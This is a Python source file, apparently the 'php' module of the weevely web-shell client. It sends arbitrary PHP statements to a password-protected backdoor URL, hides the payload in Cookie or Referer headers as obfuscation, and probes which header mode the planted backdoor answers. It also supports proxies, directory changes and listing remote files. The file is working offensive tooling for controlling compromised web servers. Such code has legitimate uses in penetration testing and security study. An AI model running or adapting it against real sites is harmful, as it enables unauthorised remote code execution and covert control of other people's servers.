'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module
from core.moduleexception import ModuleException, ProbeException, ProbeSucceed, InitException
from core.http.cmdrequest import CmdRequest, NoDataException
from core.argparse import ArgumentParser, StoredNamespace
from core.argparse import SUPPRESS
from ast import literal_eval

import random, os, shlex, types


WARN_PROXY = 'Proxies can break weevely requests, use proxychains'
WARN_TRAILING_SEMICOLON = 'command does not have trailing semicolon'
WARN_NO_RESPONSE = 'No response'
WARN_UNREACHABLE = 'URL or proxy unreachable'
WARN_CONN_ERR = 'Error connecting to backdoor URL or proxy'
WARN_INVALID_RESPONSE = 'skipping invalid response'
WARN_PHP_INTERPRETER_FAIL = 'PHP and Shell interpreters load failed'
MSG_PHP_INTERPRETER_SUCCEED = 'PHP and Shell interpreters load succeed'

class Php(Module):
    '''Execute PHP statement'''

    mode_choices = ['Cookie', 'Referer' ]

    def _init_stored_args(self):
        self.stored_args_namespace = StoredNamespace()
        self.stored_args_namespace['mode'] = None
        self.stored_args_namespace['path'] = ''

    
    def _set_args(self):
        self.argparser.add_argument('cmd', help='PHP command enclosed with brackets and terminated by semi-comma', nargs='+' )
        self.argparser.add_argument('-mode', help='Obfuscation mode', choices = self.mode_choices)
        self.argparser.add_argument('-proxy', help='HTTP proxy. Support \'http://\', \'socks5://\', \'socks4://\'')
        self.argparser.add_argument('-precmd', help='Insert string at beginning of commands', nargs='+'  )
        self.argparser.add_argument('-debug', help='Change debug class (3 or less to show request and response)', type=int, default=4, choices =range(1,5))
        self.argparser.add_argument('-post', help=SUPPRESS, type=type({}), default={})

    def _set_vectors(self):
        
        self.support_vectors.add_vector(name='ls', interpreter='file.ls', payloads = [ '$rpath' ])
 
    def _prepare(self):
        
        # Cases: 
        # 1. First call by terminal. No preset vector, do a slacky probe
        # 2. first call by cmdline (no vector)
        
        if not self.stored_args_namespace['mode']:
            
            first_probe = self.__slacky_probe()
            
            if first_probe:
                # If there is no command, raise ProbeSucceed and do not execute the command
                self.stored_args_namespace['mode'] = first_probe
                
                if self.args['cmd'][0] == ' ':
                    raise ProbeSucceed(self.name, MSG_PHP_INTERPRETER_SUCCEED)

        if self.args['cmd'][0] != ' ' and self.stored_args_namespace['mode'] in self.mode_choices:        
                    
            # Check if is raw command is not 'ls' 
            if self.args['cmd'][0][:2] != 'ls':
                    
                # Warn about not ending semicolon
                if self.args['cmd'] and self.args['cmd'][-1][-1] not in (';', '}'):
                    self.mprint('\'..%s\' %s' % (self.args['cmd'][-1], WARN_TRAILING_SEMICOLON))
              
                # Prepend chdir
                if self.stored_args_namespace['path']:
                    self.args['cmd'] = [ 'chdir(\'%s\');' % (self.stored_args_namespace['path']) ] + self.args['cmd'] 
                    
                # Prepend precmd
                if self.args['precmd']:
                    self.args['cmd'] = self.args['precmd'] + self.args['cmd']
    

    def _probe(self):
        
        
        # If 'ls', execute __ls_handler
        if self.args['cmd'][0][:2] == 'ls':
            
            rpath = ''
            if ' ' in self.args['cmd'][0]:
                rpath = self.args['cmd'][0].split(' ')[1]
                
            self._result = '\n'.join(self.support_vectors.get('ls').execute({'rpath' : rpath }))
        else:
            self._result = self.__do_request(self.args['cmd'], self.args['mode'])
        


    def __do_request(self, listcmd, mode):
        
        cmd = listcmd
        if isinstance(listcmd, types.ListType):
            cmd = ' '.join(listcmd)
        
        request = CmdRequest( self.modhandler.url, self.modhandler.password, self.args['proxy'])
        request.setPayload(cmd, mode)

        msg_class = self.args['debug']

        if self.args['post']:
            request.setPostData(self.args['post'])
            self.mprint( "Post data values:", msg_class)
            for field in self.args['post']:
                self.mprint("  %s (%i)" % (field, len(self.args['post'][field])), msg_class)

        self.mprint( "Request: %s" % (cmd), msg_class)

        try:
            response = request.execute()
        except NoDataException, e:
            raise ProbeException(self.name, WARN_NO_RESPONSE)
        except IOError, e:
            raise ProbeException(self.name, '%s. %s' % (e.strerror, WARN_UNREACHABLE))
        except Exception, e:
            raise ProbeException(self.name, '%s. %s' % (str(e), WARN_CONN_ERR))
    
        if 'eval()\'d code' in response:
            if len(response)>=100: 
                response_sum = '...' + response[-100:] 
            else: 
                response_sum = response
            
            raise ProbeException(self.name, '%s: \'%s\'' % (WARN_INVALID_RESPONSE, response_sum))
        
        self.mprint( "Response: %s" % response, msg_class)
        
        return response

    def __slacky_probe(self):
        
        for currentmode in self.mode_choices:

            rand = str(random.randint( 11111, 99999 ))

            try:
                response = self.__do_request('print(%s);' % (rand), currentmode)
            except ProbeException, e:
                self.mprint('%s with %s method' % (e.error, currentmode))
                continue
            
            if response == rand:
                return currentmode
        



